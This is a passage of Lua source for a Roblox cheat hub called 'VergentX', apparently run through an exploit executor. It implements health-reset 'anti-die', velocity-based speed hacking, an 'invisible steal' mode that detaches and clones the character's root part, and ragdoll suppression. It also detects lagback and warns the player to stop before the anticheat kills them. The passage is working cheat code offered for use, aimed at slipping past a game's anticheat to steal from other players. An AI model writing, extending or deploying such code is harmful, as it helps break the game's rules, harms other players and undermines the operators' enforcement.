    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    _vxApplySavedPos(mainFrame, "CMD_POS", 0.86, 0.5)
    mainFrame.BackgroundColor3 = Theme.Background
    mainFrame.BackgroundTransparency = 0.08
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = gui
    applyMarble(mainFrame, true)
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)
    complexBG(mainFrame, { corner = 12 * MOBILE_SCALE, border = false })

    VergentXRegisterScale(Instance.new("UIScale", mainFrame), 1)

    local borderStroke = Instance.new("UIStroke", mainFrame)
    borderStroke.Thickness = 0.8
    borderStroke.Transparency = 0.25
    borderStroke.Color = Color3.fromRGB(6, 6, 8)
    borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(borderStroke, RING_SEQ, 25)

    local strip = Instance.new("Frame", mainFrame)
    strip.Size = UDim2.new(1, 0, 0, HDR_H)
    strip.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    strip.BackgroundTransparency = 0.45
    strip.BorderSizePixel = 0
    strip.Active = true
    Instance.new("UICorner", strip).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)
    MakeDraggable(strip, mainFrame, "CMD_POS")

    local title = Instance.new("TextLabel", strip)
    title.Size = UDim2.new(1, -28 * MOBILE_SCALE, 1, 0)
    title.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Command Cooldowns"
    title.Font = Enum.Font.Gotham
    title.TextSize = 16 * MOBILE_SCALE
    title.TextColor3 = Theme.TextPrimary
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 1
    title.ZIndex = 2
    VergentXTitleGrad(title)

    local content = Instance.new("Frame", mainFrame)
    content.Size = UDim2.new(1, -28 * MOBILE_SCALE, 1, -(HDR_H + 12 * MOBILE_SCALE))
    content.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, HDR_H + 6 * MOBILE_SCALE)
    content.BackgroundTransparency = 1

    local layout = Instance.new("UIListLayout", content)
    layout.Padding = UDim.new(0, PAD)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    local entries = {}
    for i, cmd in ipairs(cmds) do
        local row = Instance.new("Frame", content)
        row.Size = UDim2.new(1, 0, 0, ROW_H)
        row.LayoutOrder = i
        row.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
        row.BackgroundTransparency = 0.32
        row.BorderSizePixel = 0
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8 * MOBILE_SCALE)
        local rowStroke = Instance.new("UIStroke", row)
        rowStroke.Color = Color3.fromRGB(6, 6, 8)
        rowStroke.Thickness = 1
        rowStroke.Transparency = 0.85
        rowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local tick = Instance.new("Frame", row)
        tick.AnchorPoint = Vector2.new(0, 0.5)
        tick.Position = UDim2.new(0, 7 * MOBILE_SCALE, 0.5, 0)
        tick.Size = UDim2.new(0, 3 * MOBILE_SCALE, 0, 16 * MOBILE_SCALE)
        tick.BackgroundColor3 = Theme.GoldHi
        tick.BackgroundTransparency = 0.25
        tick.BorderSizePixel = 0
        tick.ZIndex = 2
        Instance.new("UICorner", tick).CornerRadius = UDim.new(0, 1)

        local lbl = Instance.new("TextLabel", row)
        lbl.Position = UDim2.new(0, 17 * MOBILE_SCALE, 0, 0)
        lbl.Size = UDim2.new(1, -98 * MOBILE_SCALE, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = cmd.label
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 12 * MOBILE_SCALE
        lbl.TextTruncate = Enum.TextTruncate.AtEnd
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1
        lbl.ZIndex = 2

        local pill = Instance.new("Frame", row)
        pill.AnchorPoint = Vector2.new(1, 0.5)
        pill.Position = UDim2.new(1, -8 * MOBILE_SCALE, 0.5, 0)
        pill.Size = UDim2.new(0, 70 * MOBILE_SCALE, 0, 20 * MOBILE_SCALE)
        pill.BackgroundColor3 = Color3.fromRGB(16, 16, 19)
        pill.BackgroundTransparency = 0.15
        pill.BorderSizePixel = 0
        pill.ZIndex = 2
        Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 6 * MOBILE_SCALE)
        local pillStroke = Instance.new("UIStroke", pill)
        pillStroke.Color = Color3.fromRGB(6, 6, 8)
        pillStroke.Thickness = 0.5
        pillStroke.Transparency = 0.5
        pillStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local pillLabel = Instance.new("TextLabel", pill)
        pillLabel.Size = UDim2.new(1, 0, 1, 0)
        pillLabel.BackgroundTransparency = 1
        pillLabel.Text = "READY"
        pillLabel.Font = Enum.Font.Gotham
        pillLabel.TextSize = 10 * MOBILE_SCALE
        pillLabel.TextColor3 = Theme.Success
        pillLabel.TextStrokeTransparency = 1
        pillLabel.ZIndex = 3

        entries[i] = { action = cmd.action, tick = tick, pill = pill, label = pillLabel }
    end

    local acc = 0
    vxBind(RunService.Heartbeat, function(dt)
        if not gui.Enabled then return end
        acc = acc + dt
        if acc < 0.2 then return end
        acc = 0
        for _, e in ipairs(entries) do
            local left, total, sentAgo = AP.CooldownState(e.action)
            if left > 0 then
                e.label.Text = string.format("%ds", math.ceil(left))
                e.label.TextColor3 = Theme.Warning
                e.tick.BackgroundColor3 = Theme.Warning
                e.pill.BackgroundTransparency = 0.05
            elseif sentAgo and sentAgo < 1.6 and total <= 0 then
                e.label.Text = "SENT"
                e.label.TextColor3 = Theme.GoldHi
                e.tick.BackgroundColor3 = Theme.GoldHi
                e.pill.BackgroundTransparency = 0.05
            else
                e.label.Text = "READY"
                e.label.TextColor3 = Theme.Success
                e.tick.BackgroundColor3 = Theme.GoldHi
                e.pill.BackgroundTransparency = 0.15
            end
        end
    end)

    local Panel = {}
    function Panel.SetVisible(on)
        gui.Enabled = on and true or false
    end
    function Panel.SetPosition(pos)
        if pos then mainFrame.Position = pos end
    end
    vxAttachReveal(gui, mainFrame)

    _G.VXCmdPanel = Panel
    return Panel
end

do
    local carpetConn = nil
    local CARPET_SPEED = 140

    F.setCarpetSpeed = function(on)
        CONFIG.CARPET_SPEED = on and true or false
        if carpetConn then carpetConn:Disconnect(); carpetConn = nil end
        if not CONFIG.CARPET_SPEED then
            saveConfig()
            return
        end
        carpetConn = vxBind(RunService.Heartbeat, function()
            if not CONFIG.CARPET_SPEED then return end
            local c = LP.Character
            if not c then return end
            local hum = c:FindFirstChildOfClass("Humanoid")
            local hrp = c:FindFirstChild("HumanoidRootPart")
            if not hum or not hrp then return end
            if _G.VXEquipFlyTool then pcall(_G.VXEquipFlyTool) end
            local md = hum.MoveDirection
            local keepY = hrp.Velocity.Y
            if md.Magnitude > 0 then
                hrp.Velocity = Vector3.new(md.X * CARPET_SPEED, keepY, md.Z * CARPET_SPEED)
            else
                hrp.Velocity = Vector3.new(0, keepY, 0)
                pcall(function()
                    hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
                end)
            end
        end)
        saveConfig()
    end
end

task.spawn(function()
    _G.VXAntiDieDisabled = false
    local function setupAntiDie()
        if _G.VXAntiDieDisabled then return end
        local character = LP.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        if _G.VXAntiDieConnection then
            pcall(function() _G.VXAntiDieConnection:Disconnect() end)
        end
        _G.VXAntiDieConnection = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            if _G.VXAntiDieDisabled then return end
            if humanoid.Health <= 0 then
                humanoid.Health = humanoid.MaxHealth
            end
        end)
    end
    setupAntiDie()
    vxBind(LP.CharacterAdded, function()
        task.wait(0.5)
        if not _G.VXAntiDieDisabled then setupAntiDie() end
    end)
end)

local function hubMsg(text)
    ShowNotification("VergentX Public", text)
end

local function doInstantClone()
    if type(firesignal) ~= "function" then return false end
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not char or not hum then return false end

    local backpack = LP:FindFirstChild("Backpack")
    local cloner = (backpack and backpack:FindFirstChild("Quantum Cloner"))
        or char:FindFirstChild("Quantum Cloner")
    if not cloner then return false end

    if cloner.Parent ~= char then
        pcall(function() hum:EquipTool(cloner) end)
        task.wait()
    end

    local playerGui = LP:FindFirstChild("PlayerGui")
    local tf = playerGui and playerGui:FindFirstChild("ToolsFrames")
    local qc = tf and tf:FindFirstChild("QuantumCloner")
    local tb = qc and qc:FindFirstChild("TeleportToClone")
    if not tb then return false end

    pcall(function() cloner:Activate() end)
    task.wait(0.05)
    tb.Visible = true
    local ok = pcall(function()
        firesignal(tb.MouseButton1Click)
        firesignal(tb.MouseButton1Up)
        firesignal(tb.Activated)
    end)
    return ok
end
_G.VXInstantClone = doInstantClone

_G.__VXResetFlooding = false
local instaResetCooldown = false

local function doInstantReset()
    if _G.__VXResetFlooding or instaResetCooldown then return false end
    _G.__VXResetFlooding = true
    instaResetCooldown   = true

    task.spawn(function()
        local char = LP and LP.Character
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.Health = 0 end)
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Dead) end)
        end
        if char then
            pcall(function() char:BreakJoints() end)
        end
        pcall(function() if LP then LP:LoadCharacter() end end)

        task.wait(0.2)
        _G.__VXResetFlooding = false
        instaResetCooldown   = false
    end)
    return true
end

_G.VXInstantReset = doInstantReset

do
    local resetBindable = Instance.new("BindableEvent")
    resetBindable.Event:Connect(function() pcall(doInstantReset) end)
    task.spawn(function()
        for _ = 1, 12 do
            local ok = pcall(function()
                game:GetService("StarterGui")
                    :SetCore("ResetButtonCallback", resetBindable)
            end)
            if ok then break end
            task.wait(1)
        end
    end)
end

local KEY_ACTIONS = {
    Menu = function()
        if _G.VXToggleMenu then _G.VXToggleMenu() end
    end,

    CarpetSpeed = function()
        F.setCarpetSpeed(not CONFIG.CARPET_SPEED)
        hubMsg(CONFIG.CARPET_SPEED and "Carpet speed ON" or "Carpet speed OFF",
            CONFIG.CARPET_SPEED and Theme.Success or Theme.TextMuted)
    end,

    ProximityAP = function()
        if _G.VXToggleProximityAP then _G.VXToggleProximityAP() end
    end,

    ClickToAP = function()
        if _G.VXToggleClickToAP then _G.VXToggleClickToAP() end
    end,

    SpamNearest = function()
        if _G.VXSpamNearest then _G.VXSpamNearest() end
    end,

    SpamOwner = function()
        if _G.VXSpamOwner then _G.VXSpamOwner() end
    end,

    InstantClone = function()
        if doInstantClone() then
            hubMsg("Instant clone")
        else
            hubMsg("Quantum Cloner not ready")
        end
    end,

    InstantReset = function()
        if doInstantReset() then
            hubMsg("Reset")
        end
    end,

    Rejoin = function()
        hubMsg("Rejoining...", Theme.Warning)
        local ok = pcall(function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
        end)
        if not ok then hubMsg("Rejoin failed", Theme.Error) end
    end,

    CopyJobId = function()
        local jobId = game.JobId
        if not jobId or jobId == "" then
            hubMsg("No Job ID", Theme.Error)
            return
        end
        local copied = false
        if typeof(setclipboard) == "function" then copied = pcall(setclipboard, jobId) end
        hubMsg(copied and "Job ID copied" or "Clipboard unavailable",
            copied and Theme.Success or Theme.Error)
    end,

    ServerHop = function()
        hubMsg("Searching servers...", Theme.Warning)
        task.spawn(function()
            local server = _G.VXFindLowServer and _G.VXFindLowServer(
                tonumber(CONFIG.HOP_MAX_PLAYERS) or 2,
                function(msg) hubMsg(msg, Theme.Warning) end)
            if not server then
                hubMsg("No low server found", Theme.Error)
                return
            end
            hubMsg("Joining " .. tostring(server.playing) .. " player server", Theme.Success)
            pcall(function()
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LP)
            end)
        end)
    end,
}

vxBind(UserInputService.InputBegan, function(input, processed)
    if processed then return end
    if _G.VXBindingKey then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    if UserInputService:GetFocusedTextBox() then return end

    local pressed = input.KeyCode.Name
    for action, key in pairs(CONFIG.KEYS) do
        if key ~= "" and key == pressed then
            local fn = KEY_ACTIONS[action]
            if fn then task.spawn(function() pcall(fn) end) end
        end
    end
end)

do
    for name, fn in pairs(F) do
        if type(fn) == "function" and name:sub(1, 3) == "set" then
            F[name] = function(...)
                local a, b = fn(...)
                saveConfig()
                return a, b
            end
        end
    end
end

do
    local animPlaying = false
    local tracks = {}
    local clone, oldRoot, hip, connection
    local _invisSF, _invisSFAtt
    local invisRagdollACs, invisRagdollACChar
    local folderConnections = {}
    local serverGhosts = {}
    local ghostEnabled = true
    local lagbackCallCount, lagbackWindowStart, lastLagbackTime = 0, 0, 0
    local errorOrbActive, errorOrb = false, nil
    local _invisToggleCooldown = 0
    local _autoInvisOwned = false
    local _invisNeedStealClear = false

    _G.VXInvisibleStealEnabled = false
    _G.VXRecoveryInProgress    = false
    _G.VXInvisStealAngle       = CONFIG.INVIS_ANGLE or 180
    _G.VXSinkSliderValue       = CONFIG.INVIS_DEPTH or 8
    _G.VXAutoInvisDuringSteal  = CONFIG.AUTO_INVIS == true
    _G.VXAutoRotateInvis       = CONFIG.AUTO_ROTATE_INVIS == true
    _G.VXInvisSuppressUntil  = 0

    local function suppressAutoInvis(dur)
        local t = tick() + (tonumber(dur) or 2.5)
        if t > (_G.VXInvisSuppressUntil or 0) then _G.VXInvisSuppressUntil = t end
        _invisNeedStealClear = true
    end
    _G.VXSuppressAutoInvis = suppressAutoInvis

    local function clearInvisSuppress() _invisNeedStealClear = false end

    local function autoInvisBlocked()
        if tick() < (_G.VXInvisSuppressUntil or 0) then return true end
        if _invisNeedStealClear then _invisNeedStealClear = false end
        return false
    end

    local NotifGui = Instance.new("ScreenGui")
    NotifGui.Name = _vxName("InvisStealNotif")
    NotifGui.ResetOnSpawn = false
    NotifGui.DisplayOrder = 999
    pcall(function() mountGui(NotifGui) end)
    if not NotifGui.Parent then
        pcall(function() NotifGui.Parent = PlayerGui end)
    end

    local function clearErrorOrb()
        if errorOrb and errorOrb.Parent then errorOrb:Destroy() end
        errorOrb, errorOrbActive = nil, false
    end

    local function makeLabel(parent, size, pos, text, color)
        local l = Instance.new("TextLabel")
        l.Size = size
        l.Position = pos
        l.BackgroundTransparency = 1
        l.Text = text
        l.TextColor3 = color
        l.TextStrokeTransparency = 0
        l.TextStrokeColor3 = Color3.new(0, 0, 0)
        l.Font = Enum.Font.SourceSansBold
        l.TextScaled = true
        l.Parent = parent
        return l
    end

    local function createErrorOrb()
        if errorOrbActive then return end
        errorOrbActive = true
        for _, g in pairs(serverGhosts) do if g and g.Parent then g:Destroy() end end
        serverGhosts = {}
        local sg = Instance.new("ScreenGui")
        sg.Name = "ErrorOrbGui"
        sg.ResetOnSpawn = false
        sg.Parent = NotifGui
        local fr = Instance.new("Frame")
        fr.Size = UDim2.new(0, 500, 0, 60)
        fr.Position = UDim2.new(0.5, -250, 0.3, 0)
        fr.BackgroundTransparency = 1
        fr.BorderSizePixel = 0
        fr.Parent = sg
        local red = Color3.fromRGB(255, 0, 0)
        makeLabel(fr, UDim2.new(1, 0, 0.5, 0), UDim2.new(0, 0, 0, 0), "ERROR CAUSED BY PLAYER DEATH", red)
        makeLabel(fr, UDim2.new(1, 0, 0.5, 0), UDim2.new(0, 0, 0.5, 0), "MUST RESET TO FIX ERROR", red)
        errorOrb = sg
    end

    local function createServerGhost(position)
        if not ghostEnabled or errorOrbActive then return end
        local now = tick()
        if now - lastLagbackTime < 0.05 then return end
        lastLagbackTime = now
        if now - lagbackWindowStart > 1 then lagbackCallCount = 0; lagbackWindowStart = now end
        lagbackCallCount = lagbackCallCount + 1
        if lagbackCallCount >= 5 then
            if _G.VXInvisibleStealEnabled and not _G.VXRecoveryInProgress then
                _G.VXRecoveryInProgress = true
                task.defer(function()
                    pcall(_G.VXToggleInvisibleSteal)
                    task.wait(1.2)
                    _G.VXRecoveryInProgress = false
                end)
                return
            end
            createErrorOrb()
            return
        end
        for _, g in pairs(serverGhosts) do if g and g.Parent then g:Destroy() end end
        serverGhosts = {}
        local red, white = Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 255, 255)
        local sg = Instance.new("ScreenGui")
        sg.Name = "LagbackNotification"
        sg.ResetOnSpawn = false
        sg.Parent = NotifGui
        makeLabel(sg, UDim2.new(0, 500, 0, 30), UDim2.new(0.5, -250, 0.15, 0), "LAGBACK DETECTED", red)
        makeLabel(sg, UDim2.new(0, 650, 0, 25), UDim2.new(0.5, -325, 0.15, 32),
            "DISABLE INVISIBLE STEAL NOW OR YOU WILL BE KILLED BY ANTICHEAT", white)
        task.delay(1.5, function() if sg and sg.Parent then sg:Destroy() end end)
        local ghost = Instance.new("Part")
        ghost.Name = "LagbackGhost"
        ghost.Shape = Enum.PartType.Ball
        ghost.Size = Vector3.new(3, 3, 3)
        ghost.Color = red
        ghost.Material = Enum.Material.Glass
        ghost.Transparency = 0.3
        ghost.CanCollide = false
        ghost.Anchored = true
        ghost.CastShadow = false
        ghost.Position = position + Vector3.new(0, 5, 0)
        ghost.Parent = Workspace.CurrentCamera
        local bb = Instance.new("BillboardGui")
        bb.Size = UDim2.new(0, 400, 0, 60)
        bb.StudsOffset = Vector3.new(0, 4, 0)
        bb.AlwaysOnTop = true
        bb.Parent = ghost
        makeLabel(bb, UDim2.new(1, 0, 0, 25), UDim2.new(0, 0, 0, 0), "LAGBACK DETECTED", red)
        makeLabel(bb, UDim2.new(1, 0, 0, 25), UDim2.new(0, 0, 0, 25),
            "DISABLE INVISIBLE STEAL NOW OR YOU WILL BE KILLED BY ANTICHEAT", white)
        table.insert(serverGhosts, ghost)
    end

    local function clearAllGhosts()
        for _, ghost in pairs(serverGhosts) do
            pcall(function() if ghost and ghost.Parent then ghost:Destroy() end end)
        end
        serverGhosts = {}
        clearErrorOrb()
        lagbackCallCount, lastLagbackTime = 0, 0
        pcall(function()
            local g = NotifGui:FindFirstChild("LagbackNotification")
            while g do g:Destroy(); g = NotifGui:FindFirstChild("LagbackNotification") end
        end)
        pcall(function()
            if Workspace.CurrentCamera then
                for _, c in pairs(Workspace.CurrentCamera:GetChildren()) do
                    if c.Name == "LagbackGhost" then c:Destroy() end
                end
            end
        end)
    end

    local function removeFolders()
        local pf = Workspace:FindFirstChild(LP.Name)
        if not pf then return end
        local dr = pf:FindFirstChild("DoubleRig")
        if dr then
            local rr = dr:FindFirstChild("HumanoidRootPart") or dr:FindFirstChildWhichIsA("BasePart")
            if rr and ghostEnabled then createServerGhost(rr.Position) end
            dr:Destroy()
        end
        local cs = pf:FindFirstChild("Constraints")
        if cs then cs:Destroy() end
        local conn = pf.ChildAdded:Connect(function(child)
            if child.Name == "DoubleRig" then
                task.defer(function()
                    local rr = child:FindFirstChild("HumanoidRootPart") or child:FindFirstChildWhichIsA("BasePart")
                    if rr and ghostEnabled then createServerGhost(rr.Position) end
                    child:Destroy()
                end)
            elseif child.Name == "Constraints" then
                child:Destroy()
            end
        end)
        table.insert(folderConnections, conn)
    end

    local function doClone()
        local character = LP.Character
        if not (character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0) then
            return false
        end
        hip = character.Humanoid.HipHeight
        oldRoot = character:FindFirstChild("HumanoidRootPart")
        if not oldRoot or not oldRoot.Parent then return false end
        for _, c in pairs(oldRoot:GetChildren()) do
            if c:IsA("Attachment") and c.Name:find("Beam") then c:Destroy() end
        end
        for _, c in pairs(oldRoot:GetChildren()) do if c:IsA("Beam") then c:Destroy() end end
        local tmp = Instance.new("Model")
        tmp.Parent = game
        character.Parent = tmp
        clone = oldRoot:Clone()
        for _, c in ipairs(clone:GetChildren()) do
            if c:IsA("LinearVelocity") or c:IsA("BodyVelocity") or c:IsA("VectorForce")
            or (c:IsA("Attachment") and (c.Name == "LVAttachment" or c.Name == "InvisLVAtt")) then
                pcall(function() c:Destroy() end)
            end
        end
        clone.Parent = character
        clone.Anchored = false
        oldRoot.Parent = Workspace.CurrentCamera
        clone.CFrame = oldRoot.CFrame
        character.PrimaryPart = clone
        character.Parent = Workspace
        for _, v in pairs(character:GetDescendants()) do
            if v:IsA("Weld") or v:IsA("Motor6D") or v:IsA("WeldConstraint") then
                if v.Part0 == oldRoot then v.Part0 = clone end
                if v.Part1 == oldRoot then v.Part1 = clone end
            end
        end
        tmp:Destroy()
        return true
    end

    local function revertClone()
        local character = LP.Character
        local g_hum = character and character:FindFirstChildOfClass("Humanoid")
        if not oldRoot or not oldRoot:IsDescendantOf(Workspace) or not character
        or not g_hum or g_hum.Health <= 0 then
            return
        end
        local tmp = Instance.new("Model")
        tmp.Parent = game
        character.Parent = tmp
        oldRoot.Parent = character
        character.PrimaryPart = oldRoot
        character.Parent = Workspace
        oldRoot.CanCollide = true
        for _, v in pairs(character:GetDescendants()) do
            if v:IsA("Weld") or v:IsA("Motor6D") or v:IsA("WeldConstraint") then
                if v.Part0 == clone then v.Part0 = oldRoot end
                if v.Part1 == clone then v.Part1 = oldRoot end
            end
        end
        if clone then
            local p = clone.CFrame
            clone:Destroy()
            clone = nil
            oldRoot.CFrame = p
        end
        pcall(function()
            local _rra = oldRoot and oldRoot:FindFirstChild("RootRigAttachment")
            if _rra then
                for _, d in ipairs(character:GetDescendants()) do
                    if d:IsA("AnimationConstraint") and d.Name == "Root" then
                        if d.Attachment0 == nil or d.Attachment0.Parent == nil then d.Attachment0 = _rra end
                        break
                    end
                end
            end
        end)
        oldRoot = nil
        if character and character:FindFirstChild("Humanoid") and hip then
            character.Humanoid.HipHeight = hip
        end
        clearAllGhosts()
    end

    local function animationTrickery()
        if not (animPlaying and _G.VXInvisibleStealEnabled) then return end
        local character = LP.Character
        if not (character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0) then
            return
        end
        local anim = Instance.new("Animation")
        anim.AnimationId = "http://www.roblox.com/asset/?id=18537363391"
        local humanoid = character.Humanoid
        local animator = humanoid:FindFirstChild("Animator") or Instance.new("Animator", humanoid)
        local animTrack = animator:LoadAnimation(anim)
        animTrack.Priority = Enum.AnimationPriority.Action4
        animTrack:Play(0, 1, 0)
        anim:Destroy()
        for _, t in ipairs(tracks) do pcall(function() t:Stop() end) end
        table.clear(tracks)
        table.insert(tracks, animTrack)
        _G.VXInvisAnimTrack = animTrack
        animTrack.Stopped:Connect(function()
            if animPlaying and _G.VXInvisibleStealEnabled then animationTrickery() end
        end)
        task.delay(0, function()
            animTrack.TimePosition = 0.7
            task.delay(0.3, function() if animTrack then animTrack:AdjustSpeed(math.huge) end end)
        end)
    end

    local function invisTurnOff()
        animPlaying = false
        _G.VXInvisibleStealEnabled = false
        for _, t in pairs(tracks) do pcall(function() t:Stop() end) end
        tracks = {}
        _G.VXInvisAnimTrack = nil
        do
            local _ch = LP.Character
            local _hum = _ch and _ch:FindFirstChildOfClass("Humanoid")
            local _anr = _hum and _hum:FindFirstChildOfClass("Animator")
            if _anr then
                for _, ft in ipairs(_anr:GetPlayingAnimationTracks()) do
                    if ft.Animation and tostring(ft.Animation.AnimationId):find("18537363391") then
                        pcall(function() ft:AdjustSpeed(1); ft:Stop(0) end)
                    end
                end
            end
        end
        if connection then connection:Disconnect(); connection = nil end
        if _invisSF then pcall(function() _invisSF:Destroy() end); _invisSF = nil end
        if _invisSFAtt then pcall(function() _invisSFAtt:Destroy() end); _invisSFAtt = nil end
        for _, c in ipairs(folderConnections) do if c then pcall(function() c:Disconnect() end) end end
        folderConnections = {}
        pcall(revertClone)
        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local hrp = character and (character.PrimaryPart or character:FindFirstChild("HumanoidRootPart"))
        if character then
            for _, p in ipairs(character:GetDescendants()) do
                if p:IsA("BasePart") then pcall(function() p.Anchored = false end) end
            end
        end
        if hrp then
            pcall(function()
                local pos = hrp.Position
                hrp.CFrame = CFrame.new(pos.X, pos.Y, pos.Z)
                    * CFrame.Angles(0, hrp.Orientation.Y * math.pi / 180, 0)
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end)
        end
        if humanoid then
            pcall(function() humanoid.PlatformStand = false end)
            pcall(function() humanoid.Sit = false end)
            pcall(function() humanoid.AutoRotate = true end)
            pcall(function() if humanoid.WalkSpeed <= 0 then humanoid.WalkSpeed = 16 end end)
            pcall(function()
                if humanoid.JumpPower <= 0 and humanoid.UseJumpPower then humanoid.JumpPower = 50 end
            end)
            pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.GettingUp) end)
            pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.Freefall) end)
        end
        pcall(function()
            local cam = Workspace.CurrentCamera
            if cam and humanoid then
                cam.CameraSubject = humanoid
                cam.CameraType = Enum.CameraType.Custom
            end
        end)
        pcall(function()
            local pm = LP:FindFirstChild("PlayerScripts")
            if pm then pm = pm:FindFirstChild("PlayerModule") end
            if pm then require(pm):GetControls():Enable() end
        end)
        clearAllGhosts()
        _invisToggleCooldown = tick()
    end

    local function invisTurnOn()
        if animPlaying then return true end
        local character = LP.Character
        if not character or character.Parent == nil then return false end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then return false end
        if not (character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart) then return false end
        animPlaying = true
        _G.VXInvisibleStealEnabled = true
        tracks = {}
        removeFolders()
        if not doClone() then
            animPlaying = false
            _G.VXInvisibleStealEnabled = false
            return false
        end
        pcall(function()
            local pm = LP:FindFirstChild("PlayerScripts")
            pm = pm and pm:FindFirstChild("PlayerModule")
            if pm then require(pm):GetControls():Enable() end
        end)
        do
            local _fc = LP.Character
            local _froot = _fc and (_fc.PrimaryPart or _fc:FindFirstChild("HumanoidRootPart"))
            local _fhum = _fc and _fc:FindFirstChildOfClass("Humanoid")
            if _froot then
                pcall(function()
                    _froot.AssemblyLinearVelocity = Vector3.zero
                    _froot.AssemblyAngularVelocity = Vector3.zero
                    _froot.Anchored = false
                end)
            end
            if oldRoot then
                pcall(function()
                    oldRoot.AssemblyLinearVelocity = Vector3.zero
                    oldRoot.AssemblyAngularVelocity = Vector3.zero
                end)
            end
            if _fhum then
                pcall(function() _fhum:Move(Vector3.zero, false) end)
                pcall(function() if _fhum.PlatformStand then _fhum.PlatformStand = false end end)
                pcall(function() if _fhum.Sit then _fhum.Sit = false end end)
                pcall(function() if _fhum.WalkSpeed <= 0 then _fhum.WalkSpeed = 16 end end)
            end
        end
        task.wait(0.05)
        animationTrickery()

        local lastSetPosition = nil
        local skipFrames = 5
        local _invisFastMode = false
        local _invisSlowAccum = 0
        connection = RunService.PreSimulation:Connect(function(_psDt)
            local char = LP.Character
            if not (char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 and oldRoot) then
                return
            end
            local root = char.PrimaryPart or char:FindFirstChild("HumanoidRootPart")
            if not root then return end

            pcall(function()
                if (LP:GetAttribute("RagdollEndTime") or 0) > 0 then
                    LP:SetAttribute("RagdollEndTime", 0)
                end
                local _h = char:FindFirstChildOfClass("Humanoid")
                if _h then
                    if _h.PlatformStand then _h.PlatformStand = false end
                    local _s = _h:GetState()
                    if _s == Enum.HumanoidStateType.Physics
                    or _s == Enum.HumanoidStateType.Ragdoll
                    or _s == Enum.HumanoidStateType.FallingDown then
                        _h:ChangeState(Enum.HumanoidStateType.GettingUp)
                    end
                end
                if invisRagdollACChar ~= char then
                    invisRagdollACChar = char
                    invisRagdollACs = {}
                    for _, d in ipairs(char:GetDescendants()) do
                        if d:IsA("AnimationConstraint") then table.insert(invisRagdollACs, d) end
                    end
                end
                for _, ac in ipairs(invisRagdollACs or {}) do
                    if ac.Parent and not ac.Enabled then ac.Enabled = true end
                end
            end)

            if skipFrames > 0 then
                skipFrames = skipFrames - 1
                lastSetPosition = nil
            elseif lastSetPosition and ghostEnabled then
                local currentPos = oldRoot.Position
                local jumpDist = (currentPos - lastSetPosition).Magnitude
                if jumpDist > 16 and not _G.VXRecoveryInProgress
                and LP:GetAttribute("Stealing")
                and not autoInvisBlocked()
                and (tick() - (_G.__VXLastAutoRecoverT or 0)) > 1.5 then
                    _G.__VXLastAutoRecoverT = tick()
                    lastSetPosition = nil
                    createServerGhost(currentPos)
                    _G.VXRecoveryInProgress = true
                    local _recChar = LP.Character
                    task.spawn(function()
                        pcall(_G.VXSetInvisibleSteal, false)
                        task.wait(0.6)
                        if LP.Character == _recChar and LP:GetAttribute("Stealing")
                        and not autoInvisBlocked() then
                            pcall(_G.VXSetInvisibleSteal, true)
                        end
                        _G.VXRecoveryInProgress = false
                    end)
                end
            end

            if clone then clone.CanCollide = true end
            if not oldRoot then return end
            for _, c in pairs(oldRoot:GetChildren()) do
                if c:IsA("Beam") or (c:IsA("Attachment") and c.Name:find("Beam")) then c:Destroy() end
            end

            local rotAngle = (_G.VXAutoRotateInvis and _G.VXCurrentInvisRotation) or _G.VXInvisStealAngle or 180
            local sa = math.clamp(tonumber(_G.VXSinkSliderValue) or 8, 5, 10) * 0.5
            local _rv = root.AssemblyLinearVelocity
            local _xzSpd = Vector3.new(_rv.X, 0, _rv.Z).Magnitude
            local _hyDt = tonumber(_psDt) or (1 / 60)

            if _invisFastMode then
                if _xzSpd < 17 then
                    _invisSlowAccum = _invisSlowAccum + _hyDt
                    if _invisSlowAccum > 0.15 then _invisFastMode = false end
                else
                    _invisSlowAccum = 0
                end
            elseif _xzSpd > 22 then
                _invisFastMode = true
                _invisSlowAccum = 0
            end

            if _invisFastMode then
                if not _invisSF or _invisSF.Parent ~= oldRoot then
                    if _invisSF then pcall(function() _invisSF:Destroy() end) end
